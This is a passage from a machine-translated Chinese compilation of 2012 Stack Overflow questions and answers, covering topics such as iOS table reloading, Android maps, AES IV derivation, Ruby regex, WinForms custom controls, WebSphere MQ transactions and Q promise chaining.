收到通知后，我的其他类只是简单地重新加载 UITableView 中的数据，如下所示：

```
 - (void)notificationReceived:(NSNotification *)notification {
    [dataTable reloadData];
 } 
```

直到收到通知为止，UI 都是完全响应的。收到通知后，在刷新完成之前，您无法在其他 UI 元素之间滚动 UITableView。我敢肯定有更好的方法来做到这一点，但如何？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:53:55.283

```
dispatch_async(dispatch_get_main_queue(), ^{
    [[NSNotificationCenter defaultCenter] postNotificationName:@"Sync-Completed" object:self];
}); 
```

不是异步的——你只是在你的主队列上倾倒了大量的刷新工作（同步完成通知的处理）——所以你的应用程序将被锁定，除非你处理更新 UI 的代码。

此外，使用全局队列进行繁重的 IO 操作也不一定是个好主意。我已经看到这样做会锁定 UI 的情况 - 所以请确保它是通知而不是同步本身。

如果您发现它是同步本身 - 创建您自己的 NSOperation 队列并从该块中创建一个 NSOperation 。

您的里程可能会有所不同，但总的来说，使用全局队列对我来说不适用于异步 IO。

# android - 谷歌地图 MapView 显示网格，而不是地图

> ID：12461536
> 
> 赞同：0
> 
> 时间：2012-09-17T14:33:30.103
> 
> 标签：android, google-maps

几天来我一直在处理这个错误。当我运行我的应用程序时，我打开了 MapView，但地图没有显示。它只显示一个网格，您可以四处移动和放大和缩小。

我已经生成了两个新的 API 密钥，以为是这样，但它仍然不起作用。是的，我确实拥有清单文件下的互联网权限。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:51:54.213

您是否确定使用从调试密钥库生成的 API 密钥并在布局中适当指定？如果您从自己的私钥生成 API 密钥，那么当您将调试版本发送到您的设备时它将不起作用，因为它们是使用调试密钥签名的。

[获取调试证书 MD5 的指南。](https://developers.google.com/maps/documentation/android/mapkey#getdebugfingerprint)

# c - 我可以在win2k3上执行vs2012编译的二进制文件吗？

> ID：12461537
> 
> 赞同：1
> 
> 时间：2012-09-17T14:33:34.733
> 
> 标签：c, visual-studio-2012, windows-server-2003

我在 win2k8r2 机器上用 vs2012 Ultimate 编译 C 项目。但我想在 win2k3 服务器上执行相同的二进制文件。我可以在 vs2012 中修改设置吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:42:44.317

据我所知，如果你想让vs2012构建的本机应用程序在Windows xp和Windows Server 2003上运行，你必须安装vs2010。有一些配置可以让 vs2012 使用 vs2010 的编译器来构建应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:44:24.723

当您编译二进制文件时，链接器会将您的可执行文件与运行时库链接。此运行时库在 win2k3 服务器和 win2k8 上可能不同。但是，请尝试:-)

此外，您可以将编译器设置为在项目设置中使用静态链接（项目 -> 属性 -> 配置属性 -> C/C++ -> 代码生成 -> 将“运行时库”更改为 /MT 或 /MTd 而不是默认值/MD 或 /MDd)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T15:24:20.710

正如在 RTM 上发布的那样，使用 Visual C++ 2012 构建的本机应用程序无法在 Windows XP 或 Windows Server 2003 上运行 - 它们只能在 Vista 或更高版本上运行。

但是，微软将发布支持 Windows XP 和 Windows Server 2003 作为目标的更新（它们仍然不被支持作为开发平台）：

*   [在 Visual Studio 2012 中使用 C++ 面向 Windows XP](http://blogs.msdn.com/b/vcblog/archive/2012/06/15/10320645.aspx)

# encryption - AES 的推导 IV

> ID：12461540
> 
> 赞同：1
> 
> 时间：2012-09-17T14:33:37.543
> 
> 标签：encryption, aes, rsa

如果每次在各方之间进行交易时都会生成一个新的随机 AES 密钥。IV是否从密钥派生有关系吗？

例如：Bob 向 Alice 发送一条 AES-CBC 加密消息。Bob 为此创建了一个随机的 256 位密钥。现在假设 Bob 使用 sha256(key) 的前 128 位来获取 IV 进行加密。

Bob 使用 Alice 的公钥通过 RSA 加密来保护密钥。现在 Alice 使用她的 RSA 私钥解密密钥。然后 Alice 使用 sha256(key) 的前 128 位获取 IV 用于解密。

Alice 和 Bob 继续使用相同的程序进行交谈，但每次发送消息时都会生成一个新的随机密钥。

现在假设 Eve 可以读取 Bob 和 Alice 的 AES 和 RSA 密文。Eve 也知道 Bob 和 Alice 正在从密钥和使用的方法中推导出 IV。那仍然不能帮助 Eve 破解信息？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T15:04:32.803

如果每条消息的密钥不同，则不需要 IV（换句话说，您的 IV 可能由全零组成）。您真正不应该**做**的是使用相同的密钥加密 IV，*或者从 key 派生 IV*。

IV 用于允许密钥重用。如果您不重用密钥（即使及时），那么 IV 也是无用的。因为 IV 用于密钥重用，所以仅从密钥派生它显然不是要做的事情，如果您*要*重用它，您可能很容易破坏密钥。

# c++ - Eclipse IDE C/C++ 和 OpenCv 在编译时不显示任何内容

> ID：12461549
> 
> 赞同：0
> 
> 时间：2012-09-17T14:34:01.420
> 
> 标签：c++, eclipse, opencv

我想尝试**`OpenCV 2.4.2`**使用**`Eclipse Juno`**IDE 的**`C/C++`**. 我按照所有步骤进行安装，一切正常。

但是当我运行时，什么都没有显示。

这是简单的代码：

```
#include "opencv.hpp"

int main(int argc, char* argv[])  {
    IplImage* img = cvCreateImage( cvSize( 640, 480 ), IPL_DEPTH_8U, 3 );
    cvCircle( img, cvPoint( 320, 240 ), 100, cvScalar( 255, 0, 0 ), 5 );
    cvNamedWindow( "OpenCV Window", CV_WINDOW_NORMAL );        
    cvShowImage( "OpenCV Window", img );
    cvWaitKey(0);
    cvDestroyWindow( "OpenCV Window" ); 
    cvReleaseImage( &img );
    return 0;
} 
```

当它运行时，控制台上仅显示以下内容：

> `Info: Nothing to build for ........`

然后什么都没有..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-07-21T15:00:50.140

您可以[在此处找到扩展文档](http://docs.opencv.org/2.4/doc/tutorials/introduction/windows_install/windows_install.html)。

> 设置 OpenCV 环境变量并将其添加到系统路径
> 
> 首先设置一个环境变量，让我们的工作更轻松。这将保存我们在项目中使用的 OpenCV 库的构建目录。启动命令窗口并输入：
> 
> ```
> setx -m OPENCV_DIR D:\OpenCV\Build\x86\vc10     (suggested for Visual Studio 2010 - 32 bit Windows)
> setx -m OPENCV_DIR D:\OpenCV\Build\x64\vc10     (suggested for Visual Studio 2010 - 64 bit Windows)
> 
> setx -m OPENCV_DIR D:\OpenCV\Build\x86\vc11     (suggested for Visual Studio 2012 - 32 bit Windows)
> setx -m OPENCV_DIR D:\OpenCV\Build\x64\vc11     (suggested for Visual Studio 2012 - 64 bit Windows) 
> ```

这里的目录是您拥有 OpenCV 二进制文件（提取或构建）的地方。您可以有不同的平台（例如 x64 而不是 x86）或编译器类型，因此请替换适当的值。在这里面你应该有两个名为 lib 和 bin 的文件夹。如果您希望以计算机方式而不是用户方式进行设置，`-m`则应添加。

# windows - 如何在 Windows 8 上编写输入法？

> ID：12461553
> 
> 赞同：2
> 
> 时间：2012-09-17T14:34:30.357
> 
> 标签：windows

就像标题一样，我想编写一个模块程序来在 Windows 8 上将输入法添加到语言首选项中。我需要用我的语言编写输入法。

[https://fbcdn-sphotos-ea.akamaihd.net/hphotos-ak-ash3/561154_233448566780818_2089636107_n.jpg](https://fbcdn-sphotos-e-a.akamaihd.net/hphotos-ak-ash3/561154_233448566780818_2089636107_n.jpg)

帮我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T17:07:05.527

看到你的问题似乎不完整。让我猜猜，如果您希望用户在您的文本框中输入 URL 格式。让我们有这个示例 XAML

```
<textbox x: Name="textBox1" **InputScope="URL"** </textbox> 
```

这可能会帮助你

# ruby - 如何在两个确定的端点之间多次出现模式

> ID：12461556
> 
> 赞同：0
> 
> 时间：2012-09-17T14:34:41.460
> 
> 标签：ruby, regex

我有一个像这样的字符串：

```
CREATE TABLE foobar (
   bar foo,
   foo bar
) DISTRIBUTED BY 
```

我想从此字符串中获取所有列定义。我试过：

```
my_string.scan /CREATE TABLE .*\n([^\n]*?)\n.*DISTRIBUTED BY/ 
```

但它不会返回所需的值 ( `["bar foo,", "foo bar"]`)。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T15:16:04.997

[scan](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-scan)方法的关键是每个新匹配都在最后一个结束时开始：

```
a = "cruel world"
a.scan(/.../)        #=> ["cru", "el ", "wor"] 
```

所以你需要定义你的模式，使它在字符串的开头和中间都匹配。不用说，要建立这样一个后视表达并不容易。

但我想知道这是否足以满足您的特定目标：

```
s = <<HR
CREATE TABLE foobar (
   bar foo,
   foo bar
) DISTRIBUTED BY}
HR

ax = s.scan /\s+(.+?)(?:,\n|\n\))/
#=> [["bar foo"], ["foo bar"]] 
```

如您所见，我没有尝试在`CREATE TABLE`此处进行匹配，假设字符串已准备好查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:08:40.843

我认为这就是你想要的：

```
/CREATE TABLE .*\n((?:.*\n)+).*DISTRIBUTED BY/ 
```

`(?:.*\n)`匹配单个行，因此`((?:.*\n)+)`捕获组 #1 中的一个或多个行。包括最后一行末尾的换行符 ( `foo bar`)，但您可以在清理逗号的同时删除它（例如 from `bar foo,`）。

如果您正在考虑做更复杂的事情，请考虑使用实际的解析器；正则表达式不能很好地与 SQL 配合使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T16:05:41.160

大概这就是要走的路。

```
my_string.split[1..-2].map(&:strip) 
```

# ios - 如何修复此错误（“_OBJC_CLASS_$_AsyncSocket”，引用自：）

> ID：12461557
> 
> 赞同：0
> 
> 时间：2012-09-17T14:34:42.573
> 
> 标签：ios, asyncsocket

当我添加`AsyncSocket.h`到`.m`我的项目时，我收到了这个错误

```
Undefined symbols for architecture i386:
" _OBJC_CLASS_$_AsyncSocket", referenced from:
  objc-class-ref in ViewController.o
ld: symbol(s) not found for architecture i386
clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:34:42.573

解决问题的 2 个步骤：

1.  添加`CFNetwork.framework`到项目

2.  `AsyncSocket.m`从 Xcode 导航器（左侧）和**检查器**（右侧）中选择，在 Target Membership 部分下标记您的**项目**名称

或转到构建阶段 > 将二进制文件与库链接 > 单击 (+) > 添加`AsyncSocket.m`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-09T07:53:58.280

添加 Security.framework 以将二进制文件与库链接:)

# c# - 用于 C# 的 Maven API

> ID：12461559
> 
> 赞同：4
> 
> 时间：2012-09-17T14:34:44.347
> 
> 标签：c#, maven, maven-2, maven-3

Maven 的 API 在 C# 中可用吗？我有一个 C# 应用程序，我可以使用它访问 Maven，但目前是通过 Process 和 cmd.exe 进行的。

我所有的搜索只是告诉我如何使用 Maven 来构建 C# 项目。

与此类似的东西，但对于 C#： [http ://maven.apache.org/developers/mojo-api-specification.html](http://maven.apache.org/developers/mojo-api-specification.html)

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-17T17:30:22.177

您可以使用`.Net Maven Plugin`

链接：[http ://doodleproject.sourceforge.net/mavenite/dotnet-maven-plugin/](http://doodleproject.sourceforge.net/mavenite/dotnet-maven-plugin/)

或者你也可以使用 `NPanday`

链接：http: [//incubator.apache.org/npanday/](http://incubator.apache.org/npanday/)

# c# - 如何防止在设计时将控件拖出自定义控件？

> ID：12461562
> 
> 赞同：2
> 
> 时间：2012-09-17T14:34:50.707
> 
> 标签：c#, visual-studio-2008, .net-3.5, custom-controls, windows-forms-designer

在此用户控件中，设计者将项目添加到表单上的此控件中，并动态地将它们放置在表单上。不幸的是，一旦这些控件显示在设计器中的表单上，我就可以抓住一个并将其拉到自定义控件之外。

我该如何防止这种情况？

*编辑*

请注意，我不是在寻找处理单选按钮的解决方案或替代方案，这只是这种情况下的选择控制。如果它有助于在此处插入您想要的任何类型的控件（按钮、标签、文本框、自定义控件 1），则此问题与处理具有集合/数组类型的属性有关。最重要的是，用户不应该能够在设计器中抓取任何这些控件，其中定义了该控件的实例并将其移动到其他地方。就像 DataGridView 或 ListView 一样，尽管对象类型不同，但用户必须使用属性来更改这些控件的内容。这就是我正在寻找的行为。

RBLTest.cs

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace WFCL_Library
{
    public partial class RBLTest : UserControl
    {
        private RadioButton[] _items;

        private int leftSpacing = 100;
        private int topSpacing = 25;

        public RBLTest()
        {
            InitializeComponent();
        }

        private void RadioButtonList_Load(object sender, EventArgs e)
        {
            int curLeftPos = 0;
            int curTopPos = 0;
            foreach (RadioButton rb in _items)
            {
                rb.Location = new Point(curLeftPos, curTopPos);
                rb.Size = new Size(85, 17);

                curLeftPos += leftSpacing;

                if (curLeftPos > this.Width)
                {
                    curLeftPos = 0;
                    curTopPos += topSpacing;
                }

                this.Controls.Add(rb);                
            }
        }

        [DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
        public RadioButton[] Items
        {
            get
            {
                return _items;
            }
            set
            {
                _items = value;
            }
        }
    }       
} 
```

RBLTest.Designer.cs

```
namespace WFCL_Library
{
    partial class RBLTest
    {
        /// <summary> 
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary> 
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary> 
        /// Required method for Designer support - do not modify 
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // RBLTest
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.Name = "RBLTest";
            this.Size = new System.Drawing.Size(407, 44);
            this.Load += new System.EventHandler(this.RadioButtonList_Load);
            this.ResumeLayout(false);

        }

        #endregion

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T16:06:29.893

嗯，这取决于你想怎么做。首先，我不太喜欢允许直接访问我的用户控件上的控件。出于这个原因，我确保没有任何控件可以公开访问。我所做的是将所有内容设为私有（或有时受保护，因为派生类具有一定的灵活性很好），然后我创建属性来访问控件的必须可访问的属性和由父容器处理的事件。

~~如果这一切对您来说真的无关紧要，那么我相信您正在寻找的属性是 Control.Locked 属性。在上面的代码中，将动态控件添加到 Controls 集合后，将 Locked 设置为 true。所以：~~

```
 this.Controls.Add(rb);
            rb.Locked = true; 
```

尝试这样的事情：

```
 public class RadioButtonProperties
    {
        private RadioButton _realtedRadioButton = new RadioButton();

        public RadioButtonProperties(RadioButton radio)
        {
            _realtedRadioButton = radio;

            Name = radio.Name;
            Checked = radio.Checked;
            //add other properties
        }

        public string Name
        {
            get
            {
                //logic to to handle if checkbox is null here

                return _realtedRadioButton.Name;
            }

            set
            {
                //logic to to handle if checkbox is null here

                _realtedRadioButton.Name = value;
            }
        }

        public bool Checked
        {
            get
            {
                //logic to to handle if checkbox is null here

                return _realtedRadioButton.Checked;
            }

            set
            {
                //logic to to handle if checkbox is null here

                _realtedRadioButton.Checked = value;
            }
        }
    } 
```

现在在您的自定义控件中，您无需公开访问整个单选框数组，而是授予对数组表示的访问权限，仅公开您想要的单选框属性。例如：

```
 [DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]  
    public List<RadioButtonProperties> Items { get; set; } 
```

# zend-framework - Broadsoft过肥皂

> ID：12461564
> 
> 赞同：0
> 
> 时间：2012-09-17T14:35:00.017
> 
> 标签：zend-framework, soap

有没有人有过使用 php 或 zend 框架的 Broadsoft 的经验？我必须通过soap访问带有zend框架的Broadsoft平台，但是没有wsdl文件......问候安德里亚

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-14T00:15:26.183

在大多数情况下，Broadsoft/Broadworks WSDL 文件位于此 URL（使用您的域）

`http://YOURDOMAIN/webservice/services/ProvisioningService?wsdl`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-05-23T15:49:29.267

Wimzel 和 idaek 基本上都一针见血。我已经为 Broadsoft BroadWorks 开发了大约 6 年。Broadsoft 将所有内容都视为 OCI 命令。在 Java 或 C# 世界中，您将依赖 BroadSofts 提供的 XSD 架构，特别注意与您的 BroadSoft 服务器版本匹配的发行版本 - 然后使用 java 使用 xml-beans 或 jax-b 读取 XSD 架构和在 C# 中生成您的 java 代码，您将使用 xsd.exe。对于 Broadworks R20SP1，这会生成大约 4300 个 Java 类 O_o。我也使用 C# 做过同样的事情。

如果您不能从 PHP 迁移到 Java 或 C#，这个先前的问题可能会给您一些帮助或引导您进行其他搜索 [从 XSD 生成 PHP 类？](https://stackoverflow.com/questions/2263771/generate-php-classes-from-xsd)

注意 - 从技术上讲，您可以在端口 2208（默认）上创建一个原始 TCP 套接字，进行身份验证，登录（全部使用 OCI“命令”）并在所有后续调用中使用相同的 J-Session Id（如果及时完成）。您*可以*从头开始创建所有 OCI 命令 XML - 但如果您尝试创建供应系统或其他东西，这可能会非常痛苦。通常，在 Broadsoft 中配置组、用户和电话最简单的情况是至少大约 15 个 API 调用/命令

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-10-18T13:53:50.783

这是第一步，第二步是从 XSD shema 创建 OCI-P 消息。

# plugins - 插件中的选项更改被忽略

> ID：12461566
> 
> 赞同：1
> 
> 时间：2012-09-17T14:35:26.367
> 
> 标签：plugins, flot

我正在尝试为 flot 创建一个插件，该插件将绘制穿过原点 (0,0) 的轴，而不是仅显示在绘图的边缘。我想做的一件事是，在使用我的插件时，应该禁止绘制常规轴（边缘的轴）。因此，我在一个函数中添加了一些逻辑，该函数与 processOptions 挂钩，如下所示：

```
 plot.hooks.processOptions.push(processOptions);

    function processOptions(plot, options) {
        if (options.crossOrigin) {
            if (options.xaxis.crossOrigin) {
                options.xaxis.show = false;
                plot.hooks.drawBackground.push(drawXAxis);
            }
            if (options.yaxis.crossOrigin) {
                options.yaxis.show = false;
                plot.hooks.drawBackground.push(drawYAxis);
            }
        }
    } 
```

通过将 options.xaxis.show 设置为 false（对于 yaxis 也是如此），这应该会阻止轴出现，但它不起作用。该选项已设置，但 flot 在绘制图形时会忽略它。我可以让它不绘制常规轴的唯一方法是在设置绘图时显式设置显示选项。

任何想法为什么这不起作用？有没有办法让它工作？

**更新**：所以在玩了一段时间之后，我认为正在发生的事情是，例如，一个 options.xaxis 和一个 options.xaxes （一个数组）只包含一个条目。出于某种原因，flot 想要使用 options.xaxes[0] 中的 1 轴而不是 options.xaxis。但我不太确定这里的逻辑应该是什么。他们都将我的自定义“crossOrigin”选项合并，但只有 options.xaxis 得到它的“显示”属性集。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T18:00:39.987

使用 xaxes[0] 而不是 xaxis 似乎可以解决问题，尽管尚不清楚 flot 何时以及如何处理这些东西。

# paypal - 贝宝集成直接接受信用卡付款

> ID：12461568
> 
> 赞同：7
> 
> 时间：2012-09-17T14:35:32.567
> 
> 标签：paypal, payment-gateway, credit-card

我有一个关于 PayPal 与我的网站集成的问题。我有一个 PayPal 的 Premier 帐户。我尝试通过添加“立即购买”按钮将其与我的网站集成。当我点击它时，它会要求最终用户创建一个 PayPal 帐户。但是，我希望用户能够直接使用他们的信用卡/借记卡付款，而无需创建 PayPal 帐户。

我不是技术人员，所以我可能错过了一些东西。我想知道是否可以集成贝宝，而无需我进行技术编码。好心提醒。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:41:12.497

根据 PayPal 的说法，买家不需要 PayPal 帐户即可向您付款：

> 他们可以使用信用卡/借记卡（Visa、MasterCard、American Express 和 Discover）支付——所有这些都无需 PayPal 账户。

资料来源：[我的买家是否需要一个 PayPal 帐户才能向我付款？](https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/merchant/wpstandard/WPStandardFAQsBFTwo-outside#Q3)和[单次购买按钮](https://www.paypal.com/cgi-bin/webscr?cmd=_singleitem-intro-outside)

要创建按钮，只需访问 PayPal 的按钮创建向导并提供所需信息。提交后，PayPal 将为您自动生成 HTML。请参阅：[创建 PayPal 付款按钮](https://www.paypal.com/cgi-bin/webscr?cmd=_flow&SESSION=7hPHC5JJ6XowlUTMXfWRU-8xe8pAvRPRX0GWZ8FE6F_bEFsYRORZGPkAafG&dispatch=5885d80a13c0db1f8e263663d3faee8da6a0e86558d6153d7722c6eea13ecd7b)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T06:04:32.917

发生这种情况是因为该帐户是阿联酋的 PayPal 帐户，并且该功能尚未启用。

# ibm-mq - WebSphere MQ 和 Atomikos - 进程终止时丢失的消息

> ID：12461572
> 
> 赞同：4
> 
> 时间：2012-09-17T14:35:45.263
> 
> 标签：ibm-mq, atomikos

我的应用程序（弹簧消息侦听器）从队列中读取并在单个事务中写入数据库。我使用 Atomikos 来提供 XA 事务行为。例如，当应用程序被 kill 语句突然终止时，我看到消息丢失了。我需要使用任何特定配置吗？队列应该是持久的吗？目前，队列是非持久的。我的 MQ 版本是 v7.1。

侦听器容器的 Spring 配置如下所示：

```
<bean id="listenerContainer" class="com.miax.test.TestListenerMDPImpl" autowire="byName">
    <property name="connectionFactory" ref="mqConnFactory" />
    <property name="destinationName" value="QUEUE" />
    <property name="messageListener" ref="listenerAdapter" />
    <property name="transactionManager" ref="jtaTransactionManager" />
    <property name="sessionTransacted" value="true" />
    <property name="concurrentConsumers" value="1" />
    <!-- receive time out, should be less than tranaction time out -->
    <property name="receiveTimeout" value="3000" />
    <!-- retry connection every 1 seconds -->
    <property name="recoveryInterval" value="1000" />
    <property name="autoStartup" value="true" />
    <property name="sessionAcknowledgeMode" value="0" />
</bean> 
```

任何其他信息将根据需要提供。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:46:10.417

如果在今年 5 月之前下载，您使用的客户端必须是扩展事务客户端。自 2012 年 5 月起，任何 V7.0.1 及更高版本的客户端都内置了 XA 功能。如有疑问，请下载 WMQ 客户端的当前版本并安装。

其次，XA 事务管理器必须有它自己的与独立于应用程序的队列管理器的连接。这样它就可以在应用程序无法重新启动时连接和协调事务。为此，事务管理器必须配置一个 XX_OPEN 字符串和一个开关文件，如信息中心主题[*配置符合 XA 的事务管理器*](http://publib.boulder.ibm.com/infocenter/wmqv7/v7r1/topic/com.ibm.mq.doc/cs11560_.htm)中所述。

就其价值而言，WMQ 中不存在持久队列之类的东西。消息本身是持久的（或不持久的）。有关更多信息，请参阅[我关于该主题的博客文章](https://t-rob.net/2012/04/27/no-such-thing-as-a-persistent-queue/)。这是一个相当重要的话题，因为当人们假设队列本身是持久的时，他们倾向于设计产生意想不到的结果的解决方案。请阅读博文！

# sql - DB2 版本之间的区别

> ID：12461573
> 
> 赞同：0
> 
> 时间：2012-09-17T14:35:45.280
> 
> 标签：sql, db2

DB2 9.7 版和 DB2 10 版之间有哪些显着差异？是否值得升级到版本 10？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:12:03.197

您没有说要在哪个操作系统（Windows、Linux、z/OS）上运行 DB2 10。

这是一份[IBM 在线销售手册](http://www-01.ibm.com/software/data/db2-warehouse-10/)，其中列出了 DB2 10 的新特性。

我的建议是推迟对任何关键任务软件的任何升级，除非您正在应用所需的错误修复，或者该软件即将停止维护。让其他用户和店铺发现问题。

# javascript - SWF 提取到 PNG

> ID：12461574
> 
> 赞同：2
> 
> 时间：2012-09-17T14:35:46.373
> 
> 标签：javascript, png, flash

我有一个带有缩放和旋转功能的交互式 .swf 文件。我希望能够将任何“位置”提取到.png。我看到了像 swftools 这样的工具，但它没有帮助，因为据我了解，.swf 本身有 flashvars。关于我如何实现这一目标的任何想法。首选命令行解决方案或 javascript 解决方案。

# python - Spyne/RPClib - 如何响应 ComplexModel？

> ID：12461577
> 
> 赞同：2
> 
> 时间：2012-09-17T14:36:01.497
> 
> 标签：python, django, soap, wsdl, xmlrpclib

我是第一次使用[SPYNE](https://github.com/arskom/spyne)，我对如何使用我的 ComplexModel 做出响应感到有些困惑。

```
#service.py
class Status(ComplexModel):
    statusCode = Integer
    statusMsg = String

class ResponseData(ComplexModel):
    status = Array(Status)
    version = Integer

class SoapService(ServiceBase):
    @rpc(String, _returns=ResponseData)
    def doSomething(ctx, name):
        # ...
        # do something to get a django-model-object
        obj_data = Servers.objects.get(host=name)
        # put vars from the django-model-object into 'ResponseData' and nested 'Status'
        # e.g. statusCode = 1, statusMsg = 'online', version = 1

        """ experimental - status is not returned - version is 1:
        obj_status = Status()
        obj_status.statusCode = 1
        obj_status.statusMsg = 'online'

        retval = ResponseData()
        retval.status = obj_status
        retval.version = 1
        """
        return retval 
```

有人知道如何填充 ComplexModels 吗？[文档](http://arskom.github.com/spyne/)和示例[无法](https://github.com/arskom/spyne/tree/master/examples)帮助我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T15:22:10.523

我找到了解决方案。这里有一个小演示。

```
#service.py
class Status(ComplexModel):
    statusCode = Integer
    statusMsg = String

class ResponseData(ComplexModel):
    status = Array(Status)
    version = Integer

class SoapService(ServiceBase):
    @rpc(String, _returns=ResponseData)
    def doSomething(ctx, name):

        obj_data = Servers.objects.get(host=name)
        if obj_data.status:
            my_statusCode = 1
            my_statusMsg = 'online'
        else:
            my_statusCode = 0
            my_statusMsg = 'offline'

        retval = ResponseData()
        retval.status = [{'statusCode': my_statusCode, 'statusMsg': my_statusMsg}]
        retval.version = 1
        return retval 
```

# android - 从 SQL Server Web 服务读取应用程序

> ID：12461579
> 
> 赞同：0
> 
> 时间：2012-09-17T14:36:16.217
> 
> 标签：android, sql, sql-server, web-services, soap

我正在创建一个 Android 应用程序，我想用它来在我的 SQL 服务器上执行一个 Web 服务，该服务又运行一个存储过程。

以前从未完成过这样的项目，我想知道最好的方法是什么？

IE

1.  显示 SQL 结果
2.  从 Web 服务读取
3.  添加密码保护

我以前开发过应用程序，但从未与 SQL 相关。

通过进行一些研究，我注意到对 Web 服务的需求并创建了一个，这是运行我的应用程序以从中读取的过程，我希望得到指导。即使是一个有用的教程的链接也会很棒。谢谢。

**编辑**

在显示器上更具体。

目前，存储过程是通过水晶报表显示的，但是我不需要“钻取”或除实际查看之外的任何功能。

没有功能的类似东西会很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:44:10.957

我会推荐带有 SOAP 网络服务的 KSOAP 用于概念验证/技术演示[http://seesharpgears.blogspot.com/2010/11/basic-ksoap-android-tutorial.html](http://seesharpgears.blogspot.com/2010/11/basic-ksoap-android-tutorial.html)

或者使用带有restful/json webservice的内置JSON解析器 [如何通过android调用json webservice](https://stackoverflow.com/questions/7076576/how-to-call-a-json-webservice-through-android)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:46:09.713

也许[此链接](http://neilgoodman.net/2011/12/26/modern-techniques-for-implementing-rest-clients-on-android-4-0-and-below-part-1/)可以帮助您，它包含有关该主题的有用视频和详细信息。

另一个链接[Comsuming WCF Services With Android](http://fszlin.dymetis.com/post/2010/05/10/Comsuming-WCF-Services-With-Android.aspx)

也许这可能会有所帮助：[Android Web Service MyWeather](https://island.byu.edu/unclass/content/android-web-service-app-my-weather-running-and-full-source-code)

# javascript - 如何使用 q 进行回调链？

> ID：12461589
> 
> 赞同：8
> 
> 时间：2012-09-17T14:36:52.250
> 
> 标签：javascript, asynchronous, callback, promise, q

我在理解如何使用“q”（https://github.com/kriskowal/q）一个用于 javascript 的 Promise 库时遇到了一些问题：

```
var delayOne = function() {
    setTimeout(function() {
        return 'hi';
    }, 100);
};

var delayTwo = function(preValue) {
    setTimeout(function() {
        return preValue + ' my name';
    }, 200);
};

var delayThree = function(preValue) {
    setTimeout(function() {
        return preValue + ' is bodo';
    }, 300);
};

var delayFour = function(preValue) {
    setTimeout(function() {
        console.log(preValue);
    }, 400);

};

Q.fcall(delayOne).then(delayTwo).then(delayThree).then(delayFour).end(); 
```

这只返回未定义的......

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-24T09:38:12.890

正如 wroniasty 指出的那样，您需要从每个函数返回一个 Promise，但您还应该尽可能抽象任何面向回调的 API（如`setTimeout`），并使用返回 Promise 的 API。

在 的情况下`setTimeout`，Q 已经提供了`Q.delay(ms)`返回一个承诺，该承诺将在指定的毫秒数后解决，非常适合替换`setTimeout`：

```
var delayOne = function() {
    return Q.delay(100).then(function() {
        return 'hi';
    });
};

var delayTwo = function(preValue) {
    return Q.delay(200).then(function() {
        return preValue + ' my name';
    });
};

var delayThree = function(preValue) {
    return Q.delay(300).then(function() {
        return preValue + ' is bodo';
    });
};

var delayFour = function(preValue) {
    return Q.delay(400).then(function() {
        console.log(preValue);
    });
};

Q.fcall(delayOne).then(delayTwo).then(delayThree).then(delayFour).done(); 
```

（注：`end`已替换为`done`）

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-09-17T15:04:51.650

你得到“未定义”的原因是因为你链接的函数没有返回任何东西：

```
var delayOne = function() {
  setTimeout(function() {
    return 'hi';
  }, 100);
}; 
```

`delayOne`调用`setTimeout`，并且不返回任何内容 ( `undefined`)。

为了实现您的目标，您必须使用`Q.defer`：

```
var delayOne = function() {
  var d = Q.defer();    
  setTimeout(function() {
    d.resolve("HELLO");
  }, 100);
  return d.promise;
};

var delayTwo = function(preValue) {
   setTimeout(function() {
     alert(preValue);
   }, 
   400);
};

delayOne().then ( delayTwo ); 
```

[http://jsfiddle.net/uzJrs/2/](http://jsfiddle.net/uzJrs/2/)

